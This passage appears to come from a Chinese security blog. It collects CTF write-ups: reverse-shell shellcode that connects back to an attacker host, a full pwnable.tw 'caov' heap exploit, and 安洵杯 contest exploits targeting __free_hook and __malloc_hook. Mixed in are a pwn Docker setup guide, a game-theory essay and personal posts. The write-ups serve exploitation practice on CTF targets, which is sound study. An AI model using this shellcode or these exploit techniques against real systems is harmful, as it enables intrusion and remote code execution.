SYS_SETSOCKOPT 14 /* sys_setsockopt(2) */#define SYS_GETSOCKOPT 15 /* sys_getsockopt(2) */#define SYS_SENDMSG 16 /* sys_sendmsg(2) */#define SYS_RECVMSG 17 /* sys_recvmsg(2) */#define SYS_ACCEPT4 18 /* sys_accept4(2) */#define SYS_RECVMMSG 19 /* sys_recvmmsg(2) */#define SYS_SENDMMSG 20 /* sys_sendmmsg(2) */ 首先我们要创建socket，即调用sys_socket，所以call的值为1。sys_socket的原型如下： int socket(int domain, int type, int protocol); domain用来说明通信的范围，如IPv4，本地等。我们选择AF_INET，在Ipv4的范围内通信。 type代表通信的连接方式，如TCP，UDP等。我们选择SOCK_STREAM，即用TCP的方式通信。 protocol是指通信的附加协议。 #2.reverse shell #2.1.socket(AF_INET(2),SOCK_STREAM(1),0) shellcode=\"push 0x1;pop ebx;push eax;push ebx;push 2;\"+\\ \"mov ecx,esp;mov al,0x66;int 0x80;\" 复制文件描述符 由于关闭了标准输入，标准输出，错误输出，socket返回的fd为0，我们利用dup2来复制一个新的文件描述符1。 int dup2(int oldfd, int newfd) dup2会将旧的文件描述符oldfd，复制为一个新的文件描述符newfd，并且其指向的文件和oldfd相同。 #2.2.dup2(0,1) shellcode+=\"pop esi;pop ecx;pop ebx;mov al,0x3f;int 0x80;\" 连接attacker 利用SYS_CONNECT来连接attacker主机。 int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen); sockfd即socket的fd，这里我们的值为0。addrlen为sockaddr的大小。我们重点讲解以下sockaddr这个结构。 struct sockaddr_in { sa_family_t sin_family; /* address family: AF_INET */ in_port_t sin_port; /* port in network byte order */ struct in_addr sin_addr; /* internet address */ }; /* Internet address */ struct in_addr { uint32_t s_addr; /* address in network byte order */ }; sockaddr结构实质就是sockaddr_in，其有三个成员sin_family，sin_port，sin_addr。sinfamily代表通信域，sin_port为端口号，sin_addr为ip地址。 我们使用Ipv4通信，因此sin_family的值为 AF_INET，2两字节。 sin_port这个参数其是按照大段字节序储存，即高位地址在低位，两个字节。 sin_addr为4个字节的ip地址，小段储存。 #2.3.connect(0,addr,addrlen) shellcode+=\"mov al,0x66;push ebp;push ax;push si;mov ecx,esp;\"+\\ \"push cs;push ecx;push ebx;mov ecx,esp;mov bl,3;int 0x80;\" 获得shell 获得shell就不多做解释了 #2.4.excv(\"/bin/sh\",0,0) shellcode+=\"mov dl,al;pop ecx;mov al,0xb;push 0x68732f;push 0x6e69622f;mov ebx,esp;int 0x80;\" exp from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafte","date":"2021-07-29","objectID":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/:4:0","tags":null,"title":"文件描述符和reverse_shell","uri":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/"},{"categories":null,"content":"参考 socketcall-Linux man page socket-linux-man-page connect-linux-man-page ip-linux-man-page Play with file descriptor(Ⅰ) Play with file descriptor(Ⅱ) Play with file descriptor(Ⅲ) Linux反弹shell（一）文件描述符与重定向 Linux 反弹shell（二）反弹shell的本质 pwnable.tw kidding kidding-wp ","date":"2021-07-29","objectID":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/:5:0","tags":null,"title":"文件描述符和reverse_shell","uri":"/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8Creverse_shell/"},{"categories":["ctf"],"content":"人生自是有情痴，此恨不关风雨月。 ——《玉楼春》欧阳修 ","date":"2021-07-16","objectID":"/pwnable-caov/:0:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Caov","uri":"/pwnable-caov/"},{"categories":["ctf"],"content":"题目保护 没有开ASLR保护，其它保护全开，话不多说，上IDA，直接开整。 ","date":"2021-07-16","objectID":"/pwnable-caov/:1:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Caov","uri":"/pwnable-caov/"},{"categories":["ctf"],"content":"漏洞分析 题目是用C++编写的，给了源代码，但是从代码中看不出漏洞，所以只能从IDA来分析。用IDA分析C++程序最关键的就是构建对象的结构。 在main函数中，new了一个0x30大小的空间，并随后就对该空间的数据进行了赋值，可以合理推测，这里创建了对象，并且对象的大小为0x30。 进入显示函数，我们可以很容易的得到对象各个数据段的意义。 逆向出数据结构后，我们就可以好好的分析程序了。 在图中所示的程序处，存在一个储存于栈地址的对象，并且在程序的开始处，对该对象进行了解构。同时我们发现该函数是在sub_401396调用后随后调用，没有对栈地址清零，因此可以使用stack-reuse技术，构造栈地址上的对象，从而可以任意free，实施fast bin攻击。 ","date":"2021-07-16","objectID":"/pwnable-caov/:2:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Caov","uri":"/pwnable-caov/"},{"categories":["ctf"],"content":"漏洞利用 在漏洞利用前，我们需要理清楚程序的逻辑。在重新编辑阶段，程序会经历new1-\u003efree_arb-\u003e(new2)-\u003eshow-\u003efree1。其中new1和free1是相对应的，free_arb即我们使用stack-reuse释放的堆块。new2仅将输入的长度小于1000并且将输入的长度大于现今的长度时才调用，注意这个很关键，后面的利用会常用到这个特征。 想要获得shell，我们就需要泄露libc，而如果我们可以控制对象的key值，就可以实现任意读。但是对象是被分配在堆上的，所以想要泄露libc，首先得泄露heap。如何泄露heap？程序凡是涉及输入的，都会在输入数据的末尾加上\\x00，因此如果想通过堆块残留的数据来进行泄露，是不行的。该如何？既然利用残留的数据不行，那么我们就将正在使用的堆块释放，将堆块链表数据覆盖本身的值，进而来输出。 思路就很清晰了，利用free_arb释放一个堆块，new2分配到，然后再free_arb同一个块，利用上述条件使此时new2不满足条件，进而show泄露出heap。这一段的代码如下： enter_name('aaa') enter_info(\"a\"*0x28,1) #leak heap address #0x60 fake_chunk=p64(0)+p64(0x41)+p64(0)*6+p64(0)+p64(0x21)+p64(0)*2 edit(fake_chunk+p64(name+0x10),0x30,'a'*0x30,1) edit_name(fake_chunk+p64(name+0x10)) ru(\"after\") ru(\"Key: \") heap=u64(ru(\"\\n\").ljust(8,b'\\x00')) # target_heap=heap-(0xd50-0xc60) target_heap=heap+0xcd0-0xc90 info_addr(\"heap\",heap) info_addr(\"target_heap\",target_heap) 泄露libc就很容易了，由于开了FULL RELRO保护，GOT表会在程序运行时，提前加载好，因此如果修改key为GOT地址，就可以泄露libc了。具体的做法是用泄露的heap，计算对象所在堆块，然后free_arb，再new2分配到，进而修改。 #leak libc address fake_chunk=p64(0)+p64(0x41)+p64(heap)+p64(0)*6+p64(0x21)+p64(0)*2 edit(fake_chunk+p64(target_heap+0x10),0x30,p64(got),2) ru(\"after\") ru(\"Key: \") libc_base=u64(ru(\"\\n\").ljust(8,b'\\x00'))-libc.symbols[\"exit\"] malloc_hook=libc_base+libc.symbols[\"__malloc_hook\"] #0x4526a (0x30) 0xef6c4 (0x50) 0xf0567 (0x70) one_gadget=libc_base+0xef6c4 info_addr(\"libc_base\",libc_base) info_addr(\"malloc_hook\",malloc_hook) info_addr(\"one_gadget\",one_gadget) 打malloc_hook即可获得shell，具体思路与上面一致。 #attack fake_chunk=p64(0)+p64(0x71)+p64(0)*10+p64(name+0x10)+p64(0)*2+p64(0x21) edit_name(fake_chunk) fake_chunk=p64(0)+p64(0x71)+p64(malloc_hook-0x23) edit(fake_chunk,0x60,'a',2) edit(p64(0),0x60,b'\\x00'*0x13+p64(one_gadget),2) ","date":"2021-07-16","objectID":"/pwnable-caov/:3:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Caov","uri":"/pwnable-caov/"},{"categories":["ctf"],"content":"CODE 全部代码如下 from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: sh=remote(\"chall.pwnable.tw\",10306) else: sh=process('./caov') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def debug(command=''): context.terminal = ['tmux', 'splitw', '-v'] gdb.attach(sh,command) def choice(elect): ru(':') sl(str(elect).encode()) def edit(name,length,key,value): choice(2) enter_name(name) ru(\"length:\") sl(str(length).encode()) enter_info(key,value) def show(): choice(1) def enter_name(name): ru(\"name:\") sl(name) def enter_info(key,value): ru(\"ey:\") sl(key) ru(\"alue:\") sl(str(value).encode()) def edit_name(name): choice(2) enter_name(name) ru(\"length:\") sl(\"1024\".encode()) def exp(): #libc=ELF(\"/glibc/2.23/64/lib/libc-2.23.so\") libc=ELF(\"./libc_64.so\") name=0x6032C0 got=0x602F20 #debug(\"b*0x00000000004014F5 \\nc\") enter_name('aaa') enter_info(\"a\"*0x28,1) #leak heap address #0x60 fake_chunk=p64(0)+p64(0x41)+p64(0)*6+p64(0)+p64(0x21)+p64(0)*2 edit(fake_chunk+p64(name+0x10),0x30,'a'*0x30,1) edit_name(fake_chunk+p64(name+0x10)) ru(\"after\") ru(\"Key: \") heap=u64(ru(\"\\n\").ljust(8,b'\\x00')) # target_heap=heap-(0xd50-0xc60) target_heap=heap+0xcd0-0xc90 info_addr(\"heap\",heap) info_addr(\"target_heap\",target_heap) #leak libc address fake_chunk=p64(0)+p64(0x41)+p64(heap)+p64(0)*6+p64(0x21)+p64(0)*2 edit(fake_chunk+p64(target_heap+0x10),0x30,p64(got),2) ru(\"after\") ru(\"Key: \") libc_base=u64(ru(\"\\n\").ljust(8,b'\\x00'))-libc.symbols[\"exit\"] malloc_hook=libc_base+libc.symbols[\"__malloc_hook\"] #0x4526a (0x30) 0xef6c4 (0x50) 0xf0567 (0x70) one_gadget=libc_base+0xef6c4 info_addr(\"libc_base\",libc_base) info_addr(\"malloc_hook\",malloc_hook) info_addr(\"one_gadget\",one_gadget) #attack fake_chunk=p64(0)+p64(0x71)+p64(0)*10+p64(name+0x10)+p64(0)*2+p64(0x21) edit_name(fake_chunk) fake_chunk=p64(0)+p64(0x71)+p64(malloc_hook-0x23) edit(fake_chunk,0x60,'a',2) edit(p64(0),0x60,b'\\x00'*0x13+p64(one_gadget),2) debug() itr() exp() ","date":"2021-07-16","objectID":"/pwnable-caov/:4:0","tags":["pwn","pwnable.tw"],"title":"Pwnable Caov","uri":"/pwnable-caov/"},{"categories":null,"content":"引言 “工欲善其事，必先利其器”。有一个高效便捷的pwn环境，对于做题而言，能起到锦上添花，事半功倍的作用。 之前用vmware或则virtual box搭建的ubuntu虚拟机，感觉过于笨重，启动不仅缓慢，而且随着使用时间一长，占用的磁盘空间也日渐增加。随后又尝试过用wsl2搭建pwn环境，但是在编写代码时遇到困难。vim虽是神之编辑器，但学习曲线过于陡峭，学习成本太高，于是放弃死磕，转向了vs code。 vs code编辑器不仅有命令行窗口，而且插件功能十分强大。那我们是否可以在vs code里面编写代码，用其命令行启动虚拟机来进行调试？这里虚拟机可以采用wsl2或docker。最终我采用了docker作为虚拟环境，其中最主要的原因是vs code可以通过插件来连接docker作为编程环境，进而在编写代码时能有更好的提示。 ","date":"2021-07-16","objectID":"/%E6%9C%80%E9%85%B7pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAvscode-docker/:0:0","tags":null,"title":"最酷pwn环境搭建(vscode+docker)","uri":"/%E6%9C%80%E9%85%B7pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAvscode-docker/"},{"categories":null,"content":"vs code插件 vs code的安装这里就不阐述了，在官方找到所需系统的安装包，下载安装即可，这里说明一下为搭建本文环境需要的一些插件。 Docker Remote-containers Remote-WSL ","date":"2021-07-16","objectID":"/%E6%9C%80%E9%85%B7pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAvscode-docker/:1:0","tags":null,"title":"最酷pwn环境搭建(vscode+docker)","uri":"/%E6%9C%80%E9%85%B7pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAvscode-docker/"},{"categories":null,"content":"docker环境 docker的环境为了方便，直接使用了别人预先搭好的一个docker pwn环境skysider/pwndocker，然后对其中进行了一下几点更改。 更新了pwntools的版本（v4.5.0在连接tmux时会报错，更新至v4.5.1） 美化tmux 更改后的环境，我上传到了docker hub中，也可直接下载，而不需要再进行更改。更改后的docker环境 ","date":"2021-07-16","objectID":"/%E6%9C%80%E9%85%B7pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAvscode-docker/:2:0","tags":null,"title":"最酷pwn环境搭建(vscode+docker)","uri":"/%E6%9C%80%E9%85%B7pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAvscode-docker/"},{"categories":null,"content":"食用姿势 首先利用wsl2中的linux虚拟机来启动docker环境。启动的方法在 skysider/pwndocker 中有介绍。为了后续启动便利，创建一个可复用启动脚本。 注意：这里一定要用linux虚拟机来启动docker环境，否则docker column可能会无法连接上本地文件夹 #/bin/sh docker run -d \\ --rm \\ -h pwngame \\ --name pwngame \\ -v $(pwd):/ctf/work \\ -p 23946:23946 \\ --cap-add=SYS_PTRACE \\ luexp/dockerpwn 在做题文件夹下，打开vs code，然后在命令行中启动wsl2，运行启动脚本，打开docker环境。 注：这里想在wsl2中使用docker 需要在docker desktop中设置wsl2。 利用vs code的Remote-Container插件，连接docker环境。在vscode左侧导航栏出，点进Docker图标，然后Attach到自己打开的环境上。 就可以开始愉快的调试程序啦！ ","date":"2021-07-16","objectID":"/%E6%9C%80%E9%85%B7pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAvscode-docker/:3:0","tags":null,"title":"最酷pwn环境搭建(vscode+docker)","uri":"/%E6%9C%80%E9%85%B7pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BAvscode-docker/"},{"categories":null,"content":"上博弈论课写的小作业，觉得挺有趣，记录在博客上 抄作业还是不抄作业？网上直接复制粘贴还是自己码字？这应该是每个人的学生时代都曾经历过的抉择，本文将利用博弈论的基础知识来分析这一问题。 首先简单阐述一下本文的博弈问题。博弈的参与者有甲同学和乙同学，两位同学的老师本周布置了一篇小论文的作业，他们可以选择直接从网上抄一份作业，也可以选择自己做一份。因此甲乙同学将会有以下4种决策： 1.两位同学都选择从网上抄一份小论文。那么他们本次的作业将会十分轻松的完成，而老师虽然看出了是从网上抄袭的作业2，但不会让两位同学挂科（这里假设老师是个心地善良，心慈手软的人，不会同时挂掉班上所有人）。尽管老师会给相对较低的分数，但是对于甲乙同学而言，大家分数都低，其意义和分高没有什么区别。分数的高低关键在于差距，同时低和同时高是没有太大区别的（压力来自于竞争者）。因此他们获得的收益量化为+5。 2.甲同学选择抄一份作业，乙同学选择自主完成。那么老师将会区分出抄袭和不抄袭的作业，乙同学不管完成质量如何，将取得比甲同学更高的分数，甲同学由于抄袭，留下了被老师批评甚至挂科的隐患，因此这里量化甲同学收益为-5，乙同学收益+10。 3.乙同学选择抄一份作业，甲同学选择自主完成。这里分析与2相似，不再赘述。 4.两位同学都认真的自主完成。那么老师都会给予相应较高的分数，分数都高其实意义和分数都低是一样的，但是由于是自主完成，同学所花时间和精力都会更多，这里量化甲乙收益为+2。 据此我们可以得到本文博弈问题的支付矩阵。 乙抄 乙不抄 甲抄 (5,5) (-5,10) 甲不抄 (10,-5) (2,2) 从支付矩阵可以看出：1.在已知甲同学抄的情况下，乙同学选择不抄获得的收益最大。2.在已知甲同学不抄的情况下，乙同学选择不抄可获得最大的收益。因此乙同学最终会选择不抄，同样甲同学也会在这样的理性思维下，选择不抄，最后的纳什均衡为甲不抄，乙不抄(2,2)。可以发现抄作业和不抄作业实质为‘囚徒困境’问题。个体的理性最终导致群体的不理性。个体为了个人收益最大化，选择了不抄，但是最终却损坏了群体的利益，导致群体没有获得(5,5)的最佳收益。 本文从博弈论基础知识的角度出发，分析了抄作业和不抄作业这一博弈现象，最终得到的纳什均衡结果是不抄作业为个人收益最佳。从结论也可以引发出对内卷，996，共产主义等问题的思考。本文在分析博弈问题时，仅以甲乙两位同学作为班级整体，如果班级同学更多的话，那么多人博弈或许会更偏向于不抄，并且老师的判分标准比较单一，仅以抄和不抄来评判，没有据不抄的质量加以分析。本文还存在颇多不足。 ","date":"2021-07-04","objectID":"/%E5%9F%BA%E4%BA%8E%E5%8D%9A%E5%BC%88%E8%AE%BA%E5%88%86%E6%9E%90%E6%8A%84%E4%BD%9C%E4%B8%9A%E5%92%8C%E4%B8%8D%E6%8A%84%E4%BD%9C%E4%B8%9A/:0:0","tags":null,"title":"基于博弈论分析抄作业和不抄作业","uri":"/%E5%9F%BA%E4%BA%8E%E5%8D%9A%E5%BC%88%E8%AE%BA%E5%88%86%E6%9E%90%E6%8A%84%E4%BD%9C%E4%B8%9A%E5%92%8C%E4%B8%8D%E6%8A%84%E4%BD%9C%E4%B8%9A/"},{"categories":null,"content":"最近干啥去了 时间游走，博客停跟了小半年。我这小半年都干啥去了？一是忙于本科毕业设计的两篇论文（“产险结合会改善上市公司违规行为吗？“和\"基于点云数据的钢轨廓形三维重构技术研究”）,二是给自己放了个小小的假，之前的大学生活，可以说是除了学习，没有什么娱乐活动了。实验室，教室，寝室，食堂构成了我的生活转盘，我如其上的指针，不停的在这四个板块上，流转着。 而随着离毕业越来越近，心中对朋友的不舍日益强烈，半年来，只要有时间，就想着拉朋友出去玩儿，喝酒 and 聊人生。作为一个渴望早睡早起，对作息时间有着严格要求的人，在离毕业前的一个月，熬了数不清的通宵。这段时间，和好多好朋友的关系也都更近了一步，也有了几个想用一辈子维护的朋友。之前有听人说过，喝酒能促进人与人之间的关系，我想，这段时间的经历就在不断的证明着。有些话，只有喝了酒才会说出来，有些秘密交换之后，彼此也就成为了对方最重要最信任的人。所以很感谢这段时间的经历，让我领悟到朋友的重要性，也结实了最重要的朋友。我想，之后不管我身处何方，在为什么理想奋斗，我都不会再像从前那样，只有学习了。我虽不是一个酒鬼，但与好朋友相识，也会有了把酒言欢，大醉一场的冲动。 ","date":"2021-07-03","objectID":"/%E8%BF%91%E5%86%B5/:0:1","tags":null,"title":"近况","uri":"/%E8%BF%91%E5%86%B5/"},{"categories":null,"content":"之后要做什么 除了打ctf，做pwn题外，想接触接触web和区块链的知识，此外还有研究生的课题，这大概就是未来一段时间将要做的事情。不过，我想念朋友，深深思念着，所以就像前面所说我会尽力去维护着朋友间的友谊，但或许也不会再像毕业前这一个月每天都喝个一滩烂醉，浑浑噩噩，我终究还是有自己所想追求的东西：） ","date":"2021-07-03","objectID":"/%E8%BF%91%E5%86%B5/:0:2","tags":null,"title":"近况","uri":"/%E8%BF%91%E5%86%B5/"},{"categories":["ctf"],"content":"安询杯线下赛——WP Oh baby,don’t you know we’ve all got hidden treasures.Do you remember time? ——《Buried Treasure》Grant-Lee phillips ","date":"2020-12-13","objectID":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/:0:0","tags":["pwn","wp"],"title":"安洵杯线下赛--WP","uri":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/"},{"categories":["ctf"],"content":"前言 这应该算是我第一次正式的参加线下赛，赛场上的零食很好吃，盒饭还行，但是比不过师傅们的英姿。被打的很惨惨，原本一个组是有4个队员的，但是由于我们队有两个队员有别的事情，最后就只有两个人参加线下赛。在比赛时，我的虚拟机网络还出现了一些问题，没办法跑自动化脚本，就只能叫另一个师傅跑了，导致另一个师傅没有精力去看和修web题。不过这次比赛算是把PWN题AK了，并且pwn2打了全场最高峰。（题目已上传github） ","date":"2020-12-13","objectID":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/:1:0","tags":["pwn","wp"],"title":"安洵杯线下赛--WP","uri":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/"},{"categories":["ctf"],"content":"题解 ","date":"2020-12-13","objectID":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/:2:0","tags":["pwn","wp"],"title":"安洵杯线下赛--WP","uri":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/"},{"categories":["ctf"],"content":"PWN1 题目是一个语言解释器，当输入excv(\";sh\")时将会获得shell。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: sh=remote() else: sh=process(\"./pwn\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def debug(command=''): context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(sh,command) def run_code(code): lenth=len(code) ru(\"$\") sl(\"1\") ru(\":\") sl(str(lenth)) ru(\":\") s(code) def exp(): #debug(\"b*0x0000555555556A68\\nc\") run_code(\"ev(\\\";sh\\\")\") time.sleep(0.1) sl(\"cat flag\") itr() exp() 赛后才知道，原来这仅仅只是一个后门，程序还存在另外一个漏洞，在使用数组时存在数组越界。但由于逆向困难比较大，暂时还没有做出来，就先把WP贴出来，之后再细看。 #!/usr/bin/env python3 #-*- coding:utf-8 -*- from pwn import * import os r = lambda x : io.recv(x) ra = lambda : io.recvall() rl = lambda : io.recvline(keepends = True) ru = lambda x : io.recvuntil(x, drop = True) s = lambda x : io.send(x) sl = lambda x : io.sendline(x) sa = lambda x, y : io.sendafter(x, y) sla = lambda x, y : io.sendlineafter(x, y) ia = lambda : io.interactive() c = lambda : io.close() li = lambda x : log.info('\\x1b[01;38;5;214m' + x + '\\x1b[0m') context.log_level='debug' context.terminal = ['tmux', 'splitw', '-h'] elf_path = 'runner' libc_path = './libc.so.6' #libc_path = '/lib/x86_64-linux-gnu/libc.so.6' # remote server ip and port server_ip = \"127.0.0.1\" server_port = 20100 # if local debug LOCAL = 0 LIBC = 1 #--------------------------func----------------------------- def db(): if(LOCAL): gdb.attach(io) def input_code(sz, d): sla('$', '1') sla(':', str(sz)) sa(':', d) #--------------------------exploit-------------------------- def exploit(): li('exploit...') p = 's0 = \"' + 'A' * 0x40 + '\";' # make number of tcache bin \u003e 1 p += 's1 = \"' + 'A' * 0x450 + '\";' p += 's2 = \"' + 'A' * 0x40 + '\";' # avoid merge to top chunk and for tcache attack p += 's1 = \"' + 'A' * 0x10 + '\";' # free s1 p += 'ps(\"AAAAAAAA\");' # leak libc addr p += 'paddin_to_key = \"' + 'A' * 0x20 + '\";'; # paddin arr1[18] to tcache bin key p += 'ay arr1[1];' # for clean tcache bin key p += 'paddin_to_fd = \"' + 'A' * 0x20 + '\";'; # ajust arr2[15] to tcache bin fd p += 'paddin_to_fd_2 = \"' + 'A' * 0x10 + '\";'; # ajust arr2[15] to tcache bin fd p += 'ay arr2[1];' # for modify tcache bin fd p += 's0 = \"free\";' # free as a tcache bin p += 's2 = \"free\";' # free as a tcache bin p += 'n = 0; in(n);' # input free_hook addr p += 'arr1[18] = 256;' # clean tcache bin key p += 'arr2[15] = n;' p += 'ay align[1];' # malloc first tcache bin p += 'ay target[1];' # malloc to __free_hook p += 'in(n);' # input system addr p += 'target[0] = n;' p += 'sh = \"/bin/sh\";' #p += 'in(n);' # pause p += 'sh = \"free\";' input_code(len(p), p) leak = u64(ru('\\x7f')[-5:] + b'\\x7f\\x00\\x00') libc_base = leak - libc.sym['__malloc_hook'] - 0x10 - 1120 free_hook = libc_base + libc.sym['__free_hook'] system = libc_base + libc.sym['system'] li('leak: ' + hex(leak)) li('libc_base: ' + hex(libc_base)) p = str(free_hook - 0x28) p = p.ljust(0x20, '\\x00') s(p) p = str(system) p = p.ljust(0x20, '\\x00') s(p) def finish(): ia() c() #--------------------------main----------------------------- if __name__ == '__main__': if LOCAL: elf = ELF(elf_path) if LIBC: libc = ELF(libc_path) io = elf.process(env = {\"LD_PRELOAD\" : libc_path} ) else: libc = elf.libc io = elf.process() else:elf = ELF(elf_path) io = remote(server_ip, server_port) if LIBC: libc = ELF(libc_path) exploit() finish() ","date":"2020-12-13","objectID":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/:2:1","tags":["pwn","wp"],"title":"安洵杯线下赛--WP","uri":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/"},{"categories":["ctf"],"content":"PWN2 题目在第二次输入时存在栈溢出，刚好可以覆盖返回地址。留了一个后门函数，可以读出flag。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: sh=remote(\"192.168.206.100\",50880) else: sh=process(\"./pwn\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def debug(command=''): context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(sh,command) def stack_attack(message): ru(\":\") sl(\"1\") ru(\"3\") sl(\"3\") sl(message) def exp(): #debug(\"b*0x000000000040110A\\nc\") stack_attack(\"a\"*0x48+p64(0x000000000400F36)) itr() exp() 题目很简单，但是在比赛的时候，没有去想怎么patch，那个时候只想着用lief去patch，而没有想着绕过执行条件。比如这道题，可以直接把jnz改成jmp即可。 ","date":"2020-12-13","objectID":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/:2:2","tags":["pwn","wp"],"title":"安洵杯线下赛--WP","uri":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/"},{"categories":["ctf"],"content":"总结 线下赛的题目相对线上赛来说漏洞没有那么难利用，但是逆向的难度比线上难不少，发现难度比较高。所以线下赛发现漏洞得从攻击面来分析，不能像线上赛的题目一样，直接逆向整个程序。对于CTF来说，攻击面就是输入的数据，是否会溢出，使用的堆是否存在UAF等。这次赛前没有把自动化攻击脚本准备好，导致在比赛时，花了太多的时间在测试自动化脚本上，下次线下赛的时候，一定得把这些东西给提前准备好。还有一个有趣的姿势，由于PWN1可以直接获得shell，那么可以将别人的文件给删除，这样别的队伍每轮check时就会扣分。 ","date":"2020-12-13","objectID":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/:3:0","tags":["pwn","wp"],"title":"安洵杯线下赛--WP","uri":"/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B-wp/"},{"categories":["ctf"],"content":"几时归去，作个闲人。对一张琴，一壶酒，一溪云。 ——《行香子·述怀》苏轼 安恒杯-WP 这次参加的安恒杯，做了两道pwn题，一个拿了一血，一个拿了二血，两道题的漏洞和利用都不叫简单，逆向代码也不复杂，和朋友也成功的闯入了线下赛，期待和各位师傅们的面基，线下赛加油！2020anxun题目下载 ","date":"2020-11-26","objectID":"/%E5%AE%89%E6%81%92%E6%9D%AF-wp/:0:0","tags":["pwn","wp"],"title":"安恒杯--WP","uri":"/%E5%AE%89%E6%81%92%E6%9D%AF-wp/"},{"categories":["ctf"],"content":"Einstein 题目的逻辑是输入一个json数据，解析json后check它的字段，最后拥有三次任意地址写一个字节的机会。看到这个任意地址写，我想出题人应该借鉴了2020虎符marks man颇多。 仔细分析函数逻辑后发现，check函数不管你输入对，还是输入错都会返回1，并且两个printf函数打印的是同一个堆块，如果第一个堆块被释放后，第二次打印就会泄漏libc。 libc泄露后，接下来的问题就是如何利用任意地址写3个字节来获得Shell。利用思路和虎符marks man题目一样，打exit函数。这里我把这个利用方法详细的探讨一下，知其然要知其所以然。 查看libc源码，可以发现exit函数实际调用的是一个__run_exit_handlers函数，__run_exit_handlers函数执行中会跳转到dl_fini函数，dl_fini函数中有一段关键代码。 #ifdef SHARED int do_audit = 0; again: #endif for (Lmid_t ns = GL(dl_nns) - 1; ns \u003e= 0; --ns) { /* Protect against concurrent loads and unloads. */ __rtld_lock_lock_recursive (GL(dl_load_lock)); unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded; /* No need to do anything for empty namespaces or those used for auditing DSOs. */ if (nloaded == 0 #ifdef SHARED || GL(dl_ns)[ns]._ns_loaded-\u003el_auditing != do_audit #endif ) __rtld_lock_unlock_recursive (GL(dl_load_lock)); 其中最关键的是： __rtld_lock_lock_recursive (GL(dl_load_lock)); __rtld_lock_unlock_recursive (GL(dl_load_lock)); 这里我们以__rtld_lock_lock_recursive为例。 查看__rtld_lock_lock_recursive 的定义如下： #define __rtld_lock_lock_recursive(NAME) \\ GL(dl_rtld_unlock_recursive) (\u0026(NAME).mutex) 查看GL的定义 # define GL(name) _rtld_local._##name # else # define GL(name) _rtld_global._##name 这里出现了一个新的结构体_rtld_local。综上所述调用_rtld_lock_lock_recursive (GL(dl_load_lock))，实际就是调用**_rtld_local.dl_rtld_unlock_recursive 